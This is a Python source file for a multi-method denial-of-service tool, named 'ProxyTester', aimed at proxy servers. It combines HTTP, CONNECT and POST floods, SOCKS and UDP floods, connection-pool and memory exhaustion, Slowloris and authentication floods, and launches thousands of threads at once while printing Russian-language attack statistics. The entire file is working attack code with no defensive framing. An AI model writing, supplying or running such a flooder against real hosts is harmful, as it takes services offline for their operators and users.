import threading
import time
import random
import socket
import struct
import signal
import requests

class ProxyTester:
    def __init__(self, target, use_user_agent=False, use_cookie=False, use_bypass=False, use_proxy=False):
        self.target = target
        self.use_user_agent = use_user_agent
        self.use_cookie = use_cookie
        self.use_bypass = use_bypass
        self.use_proxy = use_proxy
        self.success_count = 0
        self.error_count = 0
        self.running = False
        self.lock = threading.Lock()
        self.host, self.port = self.parse_target(target)
        
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, signum, frame):
        print("\n\nОстанавливаю атаку...")
        self.running = False

    def parse_target(self, target):
        if ':' in target:
            host, port = target.split(':', 1)
            port = int(port)
        else:
            host = target
            port = 8080
        return host, port

    def proxy_http_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)
                sock.connect((self.host, self.port))
                proxy_request = f"GET http://google.com/ HTTP/1.1\r\nHost: google.com\r\nProxy-Connection: keep-alive\r\n\r\n"
                sock.send(proxy_request.encode())
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def proxy_connect_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)
                sock.connect((self.host, self.port))
                connect_request = f"CONNECT google.com:443 HTTP/1.1\r\nHost: google.com:443\r\nProxy-Connection: keep-alive\r\n\r\n"
                sock.send(connect_request.encode())
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def proxy_post_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)
                sock.connect((self.host, self.port))
                post_request = f"POST http://google.com/ HTTP/1.1\r\nHost: google.com\r\nContent-Length: 10000\r\nProxy-Connection: keep-alive\r\n\r\n{random._urandom(10000)}"
                sock.send(post_request.encode())
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def socks_connect_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)
                sock.connect((self.host, self.port))
                socks_handshake = b'\x05\x01\x00'
                sock.send(socks_handshake)
                socks_connect = b'\x05\x01\x00\x03\x0agoogle.com\x01\xbb'
                sock.send(socks_connect)
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def proxy_udp_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(1400)
                for _ in range(500):
                    if not self.running:
                        break
                    sock.sendto(data, (self.host, self.port))
                    with self.lock:
                        self.success_count += 1
                sock.close()
            except:
                with self.lock:
                    self.error_count += 1

    def connection_pool_exhaustion(self):
        sockets_pool = []
        while self.running:
            try:
                while len(sockets_pool) < 2000 and self.running:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(10)
                        sock.connect((self.host, self.port))
                        proxy_request = f"GET http://google.com/ HTTP/1.1\r\nHost: google.com\r\nProxy-Connection: keep-alive\r\n\r\n"
                        sock.send(proxy_request.encode())
                        sockets_pool.append(sock)
                        with self.lock:
                            self.success_count += 1
                    except:
                        break
                
                for sock in sockets_pool[:]:
                    try:
                        sock.send(b"X-Ping: 1\r\n\r\n")
                    except:
                        sockets_pool.remove(sock)
                        with self.lock:
                            self.error_count += 1
                
                time.sleep(2)
            except:
                pass

    def memory_exhaustion(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)
                sock.connect((self.host, self.port))
                large_request = f"POST http://google.com/ HTTP/1.1\r\nHost: google.com\r\nContent-Length: 50000\r\nProxy-Connection: keep-alive\r\n\r\n{random._urandom(50000)}"
                sock.send(large_request.encode())
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def slowloris_proxy(self):
        sockets_pool = []
        while self.running:
            try:
                while len(sockets_pool) < 1000 and self.running:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(30)
                        sock.connect((self.host, self.port))
                        partial_request = f"GET http://google.com/ HTTP/1.1\r\nHost: google.com\r\n"
                        sock.send(partial_request.encode())
                        sockets_pool.append(sock)
                        with self.lock:
                            self.success_count += 1
                    except:
                        break
                
                for sock in sockets_pool[:]:
                    try:
                        sock.send(b"User-Agent: Mozilla/5.0\r\n")
                    except:
                        sockets_pool.remove(sock)
                        with self.lock:
                            self.error_count += 1
                
                time.sleep(15)
            except:
                pass

    def proxy_authentication_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)
                sock.connect((self.host, self.port))
                auth_request = f"GET http://google.com/ HTTP/1.1\r\nHost: google.com\r\nProxy-Authorization: Basic {random._urandom(100).hex()}\r\n\r\n"
                sock.send(auth_request.encode())
                sock.close()
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.error_count += 1

    def random_proxy_attack(self):
        methods = [
            self.proxy_http_flood,
            self.proxy_connect_flood,
            self.proxy_post_flood,
            self.socks_connect_flood
        ]
        while self.running:
            random.choice(methods)()

    def status_worker(self):
        last_success, last_error, start_time = 0, 0, time.time()
        peak_rps = 0
        
        while self.running:
            current_time = time.time()
            elapsed_time = current_time - start_time
            
            current_success, current_error = self.success_count, self.error_count
            success_rate, error_rate = current_success - last_success, current_error - last_error
            
            total_requests = success_rate + error_rate
            current_rps = total_requests / 0.1
            peak_rps = max(peak_rps, current_rps)
            
            if total_requests > 0:
                success_percent = (success_rate / total_requests) * 100
            else:
                success_percent = 0
                
            status = "ХОРОШЕЕ" if success_percent >= 80 else "НОРМАЛЬНОЕ" if success_percent >= 50 else "ПЛОХОЕ" if success_percent >= 20 else "ОТКАЗ"
            
            print(f"\rУспешно: {self.success_count:,} | Ошибки: {self.error_count:,} | Статус: {status} | RPS: {current_rps:,.0f} | Пик: {peak_rps:,.0f}", end="", flush=True)
            
            last_success, last_error = current_success, current_error
            time.sleep(0.1)

    def start_attack(self):
        print("\033[91mАтака началась...\033[0m")
        print("Все методы: HTTP/CONNECT/POST + SOCKS + UDP + Slowloris")
        
        self.running = True
        attack_start_time = time.time()
        
        status_thread = threading.Thread(target=self.status_worker)
        status_thread.daemon = True
        status_thread.start()
        
        threads = []
        
        attack_methods = [
            self.proxy_http_flood, self.proxy_connect_flood, self.proxy_post_flood,
            self.socks_connect_flood, self.proxy_udp_flood, self.connection_pool_exhaustion,
            self.memory_exhaustion, self.slowloris_proxy, self.proxy_authentication_flood,
            self.random_proxy_attack
        ]
        
        thread_counts = [800, 800, 600, 600, 500, 200, 400, 100, 300, 1000]
        
        for i, method in enumerate(attack_methods):
            for _ in range(thread_counts[i]):
                thread = threading.Thread(target=method)
                thread.daemon = True
                threads.append(thread)
        
        print(f"Создано {len(threads)} потоков, запускаю...")
        
        batch_size = 1000
        for i in range(0, len(threads), batch_size):
            batch = threads[i:i + batch_size]
            for thread in batch:
                thread.start()
            time.sleep(0.005)
        
        print(f"Все {len(threads)} потоков запущены!")
        
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
        
        attack_duration = time.time() - attack_start_time
        total_requests = self.success_count + self.error_count
        avg_rps = total_requests / attack_duration
        
        print("\n\nАтака остановлена!")
        print(f"Итоговая статистика:")
        print(f"   Успешных запросов: {self.success_count:,}")
        print(f"   Ошибок: {self.error_count:,}")
        print(f"   Всего запросов: {total_requests:,}")
        print(f"   Время атаки: {attack_duration:.1f}с")
        print(f"   Средний RPS: {avg_rps:,.0f}")

def test_proxy(target, use_user_agent=False, use_cookie=False, use_bypass=False, use_proxy=False):
    tester = ProxyTester(target, use_user_agent, use_cookie, use_bypass, use_proxy)
    tester.start_attack()